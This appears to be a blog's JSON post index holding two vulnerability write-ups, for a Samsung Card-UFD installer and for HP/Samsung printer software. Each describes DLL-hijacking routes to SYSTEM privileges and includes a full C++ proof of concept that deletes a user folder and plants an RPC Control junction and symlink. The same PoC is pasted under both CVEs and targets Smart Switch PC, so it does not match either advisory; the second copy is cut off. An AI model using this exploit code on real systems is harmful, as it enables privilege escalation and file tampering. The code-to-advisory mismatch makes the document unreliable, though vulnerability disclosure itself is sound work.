[ { "title": "CVE-2023-41929: Samsung Card-UFD Authentication Utility for Windows Installer Local Privilege Escalation", "url": "/posts/CVE-2023-41929-Samsung-Card-UFD-Authentication-Utility-for-Windows-Installer-Local-Privilege-Escalation/", "categories": "0-day", "tags": "Samsung, 0-day, CVE, CVE-2023-41929, EoP, DoS, Mitre", "date": "2023-09-24 00:00:00 +0900", "snippet": "0x01: Details Title: Samsung Card-UFD Authentication Utility for Windows Installer Local Privilege Escalation CVE ID: CVE-2023-41929 Advisory Published: 2023/09/22 Advisory URL : https://semiconductor.samsung.com/support/quality-support/product-security-updates/ CVSS : 7.3 HIGH(CVSS Version 3.x)0x02: Test Environment Samsung Card-UFD Authentication Utility for Windows : 1.0.1 OS : Windows 10 Pro 64-bit 21H2 (build 19045.3086)0x03: Vulnerability detailsA DLL hijacking vulnerability in Samsung Memory Card &amp; UFD Authentication Utility PC Software could allow a local attacker to escalate privileges. (An attacker must already have user privileges on Windows to exploit this vulnerability.)0x04: Technical descriptionThe Samsung Card-UFD Authentication Utility installer requires administrator privileges during installation and loads many DLLs from the directory where the installer is located. However, if an attacker tries to hijack a DLL in the directory where the installer is located, the installer will generate an error and stop the program installation.The installer checks whether there are files with0x05: Proof-of-Concept (PoC)#define _CRT_SECURE_NO_WARNINGS#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;wchar.h&gt;#include &lt;string&gt;#include \"NtDefine.h\"DWORD LastError = 0;void SetLastErr(DWORD err) {\tLastError = err;}std::wstring BuildNativePath(std::wstring path) {\tif (path.rfind(L\"\\\\\", 0) != std::wstring::npos) {\t\treturn path;\t}\tpath = L\"\\\\??\\\\\" + path;\treturn path;}HANDLE OpenDirectory(std::wstring directory, DWORD access_mask, DWORD share_mode, DWORD creation_disposition) {\tdirectory = BuildNativePath(directory);\tHANDLE h;\tOBJECT_ATTRIBUTES objattr;\tUNICODE_STRING target;\tIO_STATUS_BLOCK io;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;target, directory.c_str());\tInitializeObjectAttributes(&amp;objattr, &amp;target, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tswitch (creation_disposition) {\tcase CREATE_NEW:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tcase OPEN_EXISTING:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tdefault:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t}\tif (status != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(status));\t\treturn NULL;\t}\treturn h;}bool CreateMountPoint(std::wstring dir, std::wstring target, std::wstring printname) {\tHANDLE hdir = OpenDirectory(dir, GENERIC_WRITE, ALL_SHARING, OPEN_ALWAYS);\ttarget = BuildNativePath(target);\tsize_t targetsz = target.size() * 2;\tsize_t printnamesz = printname.size() * 2;\tsize_t pathbuffersz = targetsz + printnamesz + 12;\tsize_t totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;\tREPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)_malloca(totalsz);\tmemset(rdb, 0, totalsz);\trdb-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;\trdb-&gt;ReparseDataLength = static_cast&lt;USHORT&gt;(pathbuffersz);\trdb-&gt;Reserved = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameOffset = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameLength = static_cast&lt;USHORT&gt;(targetsz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer, target.c_str(), targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameOffset = static_cast&lt;USHORT&gt;(targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameLength = static_cast&lt;USHORT&gt;(printnamesz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer + target.size() + 1, printname.c_str(), printnamesz + 2);\tDWORD cb = 0;\tbool ret = DeviceIoControl(hdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, nullptr, NULL, &amp;cb, NULL) == TRUE;\t_NtClose(hdir);\treturn ret;}HANDLE CreateNativeSymlink(std::wstring link, std::wstring target) {\tHANDLE ret;\tUNICODE_STRING ulnk;\tUNICODE_STRING utarget;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;ulnk, link.c_str());\t_RtlInitUnicodeString(&amp;utarget, target.c_str());\tOBJECT_ATTRIBUTES objattr;\tInitializeObjectAttributes(&amp;objattr, &amp;ulnk, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tNTSTATUS stat = _NtCreateSymbolicLinkObject(&amp;ret, SYMBOLIC_LINK_ALL_ACCESS,\t\t&amp;objattr, &amp;utarget);\tif (stat != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(stat));\t\treturn nullptr;\t}\treturn ret;}DWORD DeleteAllFiles(LPCWSTR szDir, DWORD recur) {\tHANDLE hSrch;\tWIN32_FIND_DATA wfd;\tDWORD res = 1;\tTCHAR DelPath[MAX_PATH];\tTCHAR FullPath[MAX_PATH];\tTCHAR TempPath[MAX_PATH];\tlstrcpy(DelPath, szDir);\tlstrcpy(TempPath, szDir);\tif (lstrcmp(DelPath + lstrlen(DelPath) - 4, L\"\\\\*.*\") != 0) {\t\tlstrcat(DelPath, L\"\\\\*.*\");\t}\thSrch = FindFirstFile(DelPath, &amp;wfd);\tif (hSrch == INVALID_HANDLE_VALUE) {\t\tif (recur &gt; 0) RemoveDirectory(TempPath);\t\treturn -1;\t}\twhile (res) {\t\twsprintf(FullPath, L\"%s\\\\%s\", TempPath, wfd.cFileName);\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_READONLY) {\t\t\tSetFileAttributes(FullPath, FILE_ATTRIBUTE_NORMAL);\t\t}\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) {\t\t\tif (lstrcmp(wfd.cFileName, L\".\")\t\t\t\t&amp;&amp; lstrcmp(wfd.cFileName, L\"..\")) {\t\t\t\trecur++;\t\t\t\tDeleteAllFiles(FullPath, recur);\t\t\t\trecur--;\t\t\t}\t\t}\t\telse {\t\t\tDeleteFile(FullPath);\t\t}\t\tres = FindNextFile(hSrch, &amp;wfd);\t}\tFindClose(hSrch);\tif (recur &gt; 0) RemoveDirectory(TempPath);\treturn 0;}void NtInit() {\tLoadLibrary(L\"ntdll.dll\");\tHMODULE hm = GetModuleHandle(L\"ntdll.dll\");\t_RtlInitUnicodeString = (ULONG(WINAPI*)(PUNICODE_STRING, PCWSTR))GetProcAddress(hm, \"RtlInitUnicodeString\");\t_RtlNtStatusToDosError = (ULONG(WINAPI*) (NTSTATUS Status))GetProcAddress(hm, \"RtlNtStatusToDosError\");\t_NtCreateSymbolicLinkObject = (NTSTATUS(WINAPI*)(\t\tOUT PHANDLE pHandle,\t\tIN ACCESS_MASK DesiredAccess,\t\tIN POBJECT_ATTRIBUTES ObjectAttributes,\t\tIN PUNICODE_STRING DestinationName))GetProcAddress(hm, \"NtCreateSymbolicLinkObject\");\t_NtCreateFile = (NTSTATUS(WINAPI*)(\t\tPHANDLE FileHandle,\t\tACCESS_MASK DesiredAccess,\t\tPOBJECT_ATTRIBUTES ObjectAttributes,\t\tPIO_STATUS_BLOCK IoStatusBlock,\t\tPLARGE_INTEGER AllocationSize,\t\tULONG FileAttributes,\t\tULONG ShareAccess,\t\tULONG CreateDisposition,\t\tULONG CreateOptions,\t\tPVOID EaBuffer,\t\tULONG EaLength))GetProcAddress(hm, \"NtCreateFile\");\t_NtClose = (NTSTATUS(WINAPI*)(HANDLE Handle))GetProcAddress(hm, \"NtClose\");}int main() {\tNtInit();\tstd::wstring UserProfilePath = std::wstring(_wgetenv(L\"USERPROFILE\"));\tstd::wstring LinkFile = L\"CRMData.db\";\tstd::wstring LinkDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Samsung\\\\Smart Switch PC\");\tstd::wstring TargetFile = L\"C:\\\\Windows\\\\system.ini\";\tstd::wstring RpcControl = L\"\\\\RPC Control\";\tstd::wstring RpcControlFile = RpcControl + L\"\\\\\" + LinkFile;\tstd::wstring ParentDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Samsung\");\tif (GetFileAttributesW(ParentDirectory.c_str()) != INVALID_FILE_ATTRIBUTES) {\t\tDeleteAllFiles(ParentDirectory.c_str(), 1);\t}\tCreateDirectoryW(ParentDirectory.c_str(), NULL);\tif (!CreateMountPoint(LinkDirectory, RpcControl, L\"Junction\")) {\t\tstd::cout &lt;&lt; \"[-] RPC Control Junction Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] RPC Control Junction Success\" &lt;&lt; std::endl;\tHANDLE hFile = CreateNativeSymlink(RpcControlFile, BuildNativePath(TargetFile));\tif (hFile == INVALID_HANDLE_VALUE || hFile == NULL) {\t\tstd::cout &lt;&lt; \"[-] CreateNativeSymlink Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] CreateNativeSymlink Success Handle : \" &lt;&lt; hFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"[+] CreateSymlink Success\" &lt;&lt; std::endl;\tstd::wcout &lt;&lt; L\"[+] \" &lt;&lt; (LinkDirectory + L\"\\\\\" + LinkFile) &lt;&lt; L\" -&gt; \" &lt;&lt; TargetFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"Press ENTER to exit and delete the symlink\" &lt;&lt; std::endl;\tgetchar();\treturn 0;}main.cpp#pragma once#include &lt;Windows.h&gt;#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)#define STATUS_SUCCESS 0x00000000#define OBJ_CASE_INSENSITIVE 0x00000040L#define \tFILE_OPEN 0x00000001#define \tFILE_OPEN_IF 0x00000003#define \tFILE_CREATE 0x00000002#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_OPEN_REPARSE_POINT 0x00200000#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE#define GENERIC_READ_WRITE GENERIC_READ|GENERIC_WRITE#define InitializeObjectAttributes( p, n, a, r, s ) { \\ (p)-&gt;uLength = sizeof( OBJECT_ATTRIBUTES ); \\ (p)-&gt;hRootDirectory = r; \\ (p)-&gt;uAttributes = a; \\ (p)-&gt;pObjectName = n; \\ (p)-&gt;pSecurityDescriptor = s; \\ (p)-&gt;pSecurityQualityOfService = NULL; \\}typedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; union { struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; } SymbolicLinkReparseBuffer; struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME;} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;typedef struct _FILE_DISPOSITION_INFORMATION_EX { ULONG Flags;} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer;} UNICODE_STRING;typedef UNICODE_STRING* PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG uLength; HANDLE hRootDirectory; PUNICODE_STRING pObjectName; ULONG uAttributes; PVOID pSecurityDescriptor; PVOID pSecurityQualityOfService;} OBJECT_ATTRIBUTES;typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information;} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;ULONG(WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);ULONG(WINAPI* _RtlNtStatusToDosError)(NTSTATUS Status);NTSTATUS(WINAPI* _NtCreateFile)( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)( OUT PHANDLE pHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PUNICODE_STRING DestinationName);NTSTATUS(WINAPI* _NtClose)( HANDLE Handle );NtDefine.h Use Visual Studio 2019. Compile the project in the DLL directory in x86 Release mode. Rename the compiled dll to SspiCli.DLL and place it in the same directory as SMCA_Win_P01_RC01_20191202.exe. Run SMCA_Win_P01_RC01_20191202.exe to perform Samsung Card-UFD Authentication Utility installation.0x06: Affected ProductsThis vulnerability affects the following product: Samsung Memory Card &amp; UFD Authentication Utility PC Software &lt; 1.0.20x07: Credit informationHeeChan Kim (@heegong123) of TeamH4C0x08: TimeLine 2023/06/29 : First time contacted via Samsung Mobile Security. 2023/07/03 : I received notification that the vulnerability had been transferred to the Samsung Device Solution Product Security Team. 2023/07/26 : The vulnerability is High, CVSS is 7.3, and I have been notified that the vulnerability will be patched. 2023/09/22 : The vulnerability has been patched, and CVE-2023-41929 has been issued.0x09: Reference https://semiconductor.samsung.com/support/quality-support/product-security-updates/ https://nvd.nist.gov/vuln/detail/CVE-2023-41929" }, { "title": "CVE-2022-4894: Certain HP and Samsung printer software - Potential elevation of privileges", "url": "/posts/CVE-2022-4894-Certain-HP-and-Samsung-printer-software-Potential-elevation-of-privileges/", "categories": "0-day", "tags": "Samsung, HP, 0-day, CVE, CVE-2022-4894, EoP, DoS, Mitre", "date": "2023-09-24 00:00:00 +0900", "snippet": "0x01: Details Title: Certain HP and Samsung printer software - Potential elevation of privileges CVE ID: CVE-2022-4894 Vendor ID : PSR-2022-0147 Advisory Published: 2023/08/02 Advisory URL : https://support.hp.com/us-en/document/ish_8947379-8947403-16/hpsbpi03857 CVSS : 8.2 HIGH(CVSS Version 3.0)0x02: Test Environment Samsung Universal Print Driver3 for Windows : 3.00.13.00 Samsung Scan To PC Lite for Windows : 1.2.14.0 Samsung Printer Setup Program for Windows : 1.0.0.32 Samsung Printer Diagnostics for Windows : 1.0.4.29 OS : Windows 10 Pro 64-bit 21H2 (build 19044.1889)0x03: Vulnerability detailsDLL hijacking vulnerability in Samsung Printer Softwares allow attacker to execute arbitrary code.0x04: Technical descriptionSamsung Printer DiagnosticsThe Samsung Printer Diagnostics installer operates with Administrator privileges. The program writes logs to the location C:\\Users\\%Username%\\AppData\\Local\\Temp\\RemoteDiagnosis.exe.log. The log format is as follows:////////////////////////////////////////////////////////////// //// Silent Installer //// //////////////////////////////////////////////////////////////Data : 2022,08,31...[18:36:11] Get Properties [COMMAND]: [Latest_Universal\\setup.exe] [54][18:36:11] [RunExecute] Command Line = [C:\\Users\\%Username%\\AppData\\Local\\Temp\\33791f\\Latest_Universal\\setup.exe] , wait time = -1, Working Directory = [C:\\USERS\\%Username%\\APPDATA\\LOCAL\\TEMP\\33791F\\LATEST_UNIVERSAL]...Log file contains the path to the directory where the dll files are to be loaded.Example: C:\\Users\\%Username%\\AppData\\Local\\Temp\\{Random_STRING}\\LATEST_UNIVERSALThe Samsung Printer Diagnostics installer loads cscapi.dll from this directory. This dll file is loaded after installation is complete. For this reason, the dll hijacking succeeds by looking for that Random_STRING in the log file and copying the dll to the C:\\Users\\%Username%\\AppData\\Local\\Temp\\{Random_STRING}\\LATEST_UNIVERSAL directory. Since this dll is loaded with Administrator privileges, it can be elevated with SYSTEM privileges.Samsung Printer Setup ProgramThe Samsung Printer Setup Program installer operates with Administrator privileges. The program writes logs to the location C:\\Users\\%Username%\\AppData\\Local\\Temp\\SamsungPrinterInstaller.exe.log. The log format is as follows:////////////////////////////////////////////////////////////// //// Silent Installer //// //////////////////////////////////////////////////////////////Data : 2022,08,31...[20:07:06] Success to Extract[20:07:06] Get Properties [COMMAND]: [Latest_WIA\\SPNTInst.exe] [48][20:07:06] [RunExecute] Command Line = [C:\\Users\\%Username%\\AppData\\Local\\Temp\\86b53a\\Latest_WIA\\SPNTInst.exe] , wait time = -1, Working Directory = [C:\\USERS\\%Username%\\APPDATA\\LOCAL\\TEMP\\86B53A\\LATEST_WIA]Log file contains the path to the directory where the dll files are to be loaded.Example: C:\\Users\\%Username%\\AppData\\Local\\Temp\\{Random_STRING}\\Latest_WIAThe Samsung Printer Setup Program installer loads DPAPI.DLL from this directory. This dll file is loaded after installation is complete. For this reason, the dll hijacking succeeds by looking for that Random_STRING in the log file and copying the dll to the C:\\Users\\%Username%\\AppData\\Local\\Temp\\{Random_STRING}\\Latest_WIAdirectory. Since this dll is loaded with Administrator privileges, it can be elevated with SYSTEM privileges.Samsung Universal Print Driver3Many DLLs are loaded from the directory where the Samsung Universal Print Driver installer file SamsungUniversalPrintDriver3_V3.00.13.00.exe is located. If these DLLs are not in the directory, DLLs are loaded from the C:\\Windows\\SysWOW64 directory. Among these Dlls, TextShaping.dll is loaded, and this DLL load is done with Administrator privileges. So, by placing TextShaping.dll in the directory where the Samsung Universal Print Driver installer file is located, you can gain SYSTEM privileges by abusing Administrator privileges.Samsung Scan To PC LiteThe Samsung Scan To PC Lite installer operates with Administrator privileges. This installer loads ${MUI_HELPER}.DLL as the installation proceeds. This dll is loaded from the directory registered in the user environment variable, but the %USERPROFILE%\\AppData\\Local\\Microsoft\\WindowsApps directory among the user environment variables can be accessed by normal users, so an attacker can abuse the administrator’s privileges. Eventually, dll hijacking can be used to elevate to SYSTEM privileges.Note: %Username% must be replaced with the account name of the user logged into Windows.0x05: Proof-of-Concept (PoC)#define _CRT_SECURE_NO_WARNINGS#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;wchar.h&gt;#include &lt;string&gt;#include \"NtDefine.h\"DWORD LastError = 0;void SetLastErr(DWORD err) {\tLastError = err;}std::wstring BuildNativePath(std::wstring path) {\tif (path.rfind(L\"\\\\\", 0) != std::wstring::npos) {\t\treturn path;\t}\tpath = L\"\\\\??\\\\\" + path;\treturn path;}HANDLE OpenDirectory(std::wstring directory, DWORD access_mask, DWORD share_mode, DWORD creation_disposition) {\tdirectory = BuildNativePath(directory);\tHANDLE h;\tOBJECT_ATTRIBUTES objattr;\tUNICODE_STRING target;\tIO_STATUS_BLOCK io;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;target, directory.c_str());\tInitializeObjectAttributes(&amp;objattr, &amp;target, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tswitch (creation_disposition) {\tcase CREATE_NEW:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tcase OPEN_EXISTING:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tdefault:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t}\tif (status != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(status));\t\treturn NULL;\t}\treturn h;}bool CreateMountPoint(std::wstring dir, std::wstring target, std::wstring printname) {\tHANDLE hdir = OpenDirectory(dir, GENERIC_WRITE, ALL_SHARING, OPEN_ALWAYS);\ttarget = BuildNativePath(target);\tsize_t targetsz = target.size() * 2;\tsize_t printnamesz = printname.size() * 2;\tsize_t pathbuffersz = targetsz + printnamesz + 12;\tsize_t totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;\tREPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)_malloca(totalsz);\tmemset(rdb, 0, totalsz);\trdb-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;\trdb-&gt;ReparseDataLength = static_cast&lt;USHORT&gt;(pathbuffersz);\trdb-&gt;Reserved = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameOffset = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameLength = static_cast&lt;USHORT&gt;(targetsz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer, target.c_str(), targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameOffset = static_cast&lt;USHORT&gt;(targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameLength = static_cast&lt;USHORT&gt;(printnamesz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer + target.size() + 1, printname.c_str(), printnamesz + 2);\tDWORD cb = 0;\tbool ret = DeviceIoControl(hdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, nullptr, NULL, &amp;cb, NULL) == TRUE;\t_NtClose(hdir);\treturn ret;}HANDLE CreateNativeSymlink(std::wstring link, std::wstring target) {\tHANDLE ret;\tUNICODE_STRING ulnk;\tUNICODE_STRING utarget;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;ulnk, link.c_str());\t_RtlInitUnicodeString(&amp;utarget, target.c_str());\tOBJECT_ATTRIBUTES objattr;\tInitializeObjectAttributes(&amp;objattr, &amp;ulnk, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tNTSTATUS stat = _NtCreateSymbolicLinkObject(&amp;ret, SYMBOLIC_LINK_ALL_ACCESS,\t\t&amp;objattr, &amp;utarget);\tif (stat != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(stat));\t\treturn nullptr;\t}\treturn ret;}DWORD DeleteAllFiles(LPCWSTR szDir, DWORD recur) {\tHANDLE hSrch;\tWIN32_FIND_DATA wfd;\tDWORD res = 1;\tTCHAR DelPath[MAX_PATH];\tTCHAR FullPath[MAX_PATH];\tTCHAR TempPath[MAX_PATH];\tlstrcpy(DelPath, szDir);\tlstrcpy(TempPath, szDir);\tif (lstrcmp(DelPath + lstrlen(DelPath) - 4, L\"\\\\*.*\") != 0) {\t\tlstrcat(DelPath, L\"\\\\*.*\");\t}\thSrch = FindFirstFile(DelPath, &amp;wfd);\tif (hSrch == INVALID_HANDLE_VALUE) {\t\tif (recur &gt; 0) RemoveDirectory(TempPath);\t\treturn -1;\t}\twhile (res) {\t\twsprintf(FullPath, L\"%s\\\\%s\", TempPath, wfd.cFileName);\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_READONLY) {\t\t\tSetFileAttributes(FullPath, FILE_ATTRIBUTE_NORMAL);\t\t}\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) {\t\t\tif (lstrcmp(wfd.cFileName, L\".\")\t\t\t\t&amp;&amp; lstrcmp(wfd.cFileName, L\"..\")) {\t\t\t\trecur++;\t\t\t\tDeleteAllFiles(FullPath, recur);\t\t\t\trecur--;\t\t\t}\t\t}\t\telse {\t\t\tDeleteFile(FullPath);\t\t}\t\tres = FindNextFile(hSrch, &amp;wfd);\t}\tFindClose(hSrch);\tif (recur &gt; 0) RemoveDirectory(TempPath);\treturn 0;}void NtInit() {\tLoadLibrary(L\"ntdll.dll\");\tHMODULE hm = GetModuleHandle(L\"ntdll.dll\");\t_RtlInitUnicodeString = (ULONG(WINAPI*)(PUNICODE_STRING, PCWSTR))GetProcAddress(hm, \"RtlInitUnicodeString\");\t_RtlNtStatusToDosError = (ULONG(WINAPI*) (NTSTATUS Status))GetProcAddress(hm, \"RtlNtStatusToDosError\");\t_NtCreateSymbolicLinkObject = (NTSTATUS(WINAPI*)(\t\tOUT PHANDLE pHandle,\t\tIN ACCESS_MASK DesiredAccess,\t\tIN POBJECT_ATTRIBUTES ObjectAttributes,\t\tIN PUNICODE_STRING DestinationName))GetProcAddress(hm, \"NtCreateSymbolicLinkObject\");\t_NtCreateFile = (NTSTATUS(WINAPI*)(\t\tPHANDLE FileHandle,\t\tACCESS_MASK DesiredAccess,\t\tPOBJECT_ATTRIBUTES ObjectAttributes,\t\tPIO_STATUS_BLOCK IoStatusBlock,\t\tPLARGE_INTEGER AllocationSize,\t\tULONG FileAttributes,\t\tULONG ShareAccess,\t\tULONG CreateDisposition,\t\tULONG CreateOptions,\t\tPVOID EaBuffer,\t\tULONG EaLength))GetProcAddress(hm, \"NtCreateFile\");\t_NtClose = (NTSTATUS(WINAPI*)(HANDLE Handle))GetProcAddress(hm, \"NtClose\");}int main() {\tNtInit();\tstd::wstring UserProfilePath = std::wstring(_wgetenv(L\"USERPROFILE\"));\tstd::wstring LinkFile = L\"CRMData.db\";\tstd::wstring LinkDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Samsung\\\\Smart Switch PC\");\tstd::wstring TargetFile = L\"C:\\\\Windows\\\\system.ini\";\tstd::wstring RpcControl = L\"\\\\RPC Control\";\tstd::wstring RpcControlFile = RpcControl + L\"\\\\\" + LinkFile;\tstd::wstring ParentDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Samsung\");\tif (GetFileAttributesW(ParentDirectory.c_str()) != INVALID_FILE_ATTRIBUTES) {\t\tDeleteAllFiles(ParentDirectory.c_str(), 1);\t}\tCreateDirectoryW(ParentDirectory.c_str(), NULL);\tif (!CreateMountPoint(LinkDirectory, RpcControl, L\"Junction\")) {\t\tstd::cout &lt;&lt; \"[-] RPC Control Junction Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] RPC Control Junction Success\" &lt;&lt; std::endl;\tHANDLE hFile = CreateNativeSymlink(RpcControlFile, BuildNativePath(TargetFile));\tif (hFile == INVALID_HANDLE_VALUE || hFile == NULL) {\t\tstd::cout &lt;&lt; \"[-] CreateNativeSymlink Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] CreateNativeSymlink Success Handle : \" &lt;&lt; hFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"[+] CreateSymlink Success\" &lt;&lt; std::endl;\tstd::wcout &lt;&lt; L\"[+] \" &lt;&lt; (LinkDirectory + L\"\\\\\" + LinkFile) &lt;&lt; L\" -&gt; \" &lt;&lt; TargetFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"Press ENTER to exit and delete the symlink\" &lt;&lt; std::endl;\tgetchar();\treturn 0;}main.cpp#pragma once#include &lt;Windows.h&gt;#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)#define STATUS_SUCCESS 0x00000000#define OBJ_CASE_INSENSITIVE 0x00000040L#define \tFILE_OPEN 0x00000001#define \tFILE_OPEN_IF 0x00000003#define \tFILE_CREATE 0x00000002#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_OPEN_REPARSE_POINT 0x00200000#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE#define GENERIC_READ_WRITE GENERIC_READ|GENERIC_WRITE#define InitializeObjectAttributes( p, n, a, r, s ) { \\ (p)-&gt;uLength = sizeof( OBJECT_ATTRIBUTES ); \\ (p)-&gt;hRootDirectory = r; \\ (p)-&gt;uAttributes = a; \\ (p)-&gt;pObjectName = n; \\ (p)-&gt;pSecurityDescriptor = s; \\ (p)-&gt;pSecurityQualityOfService = NULL; \\}typedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; union { struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; } SymbolicLinkReparseBuffer; struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME;} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;typedef struct _FILE_DISPOSITION_INFORMATION_EX { ULONG Flags;} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)typedef struct _UNICODE_STRING { 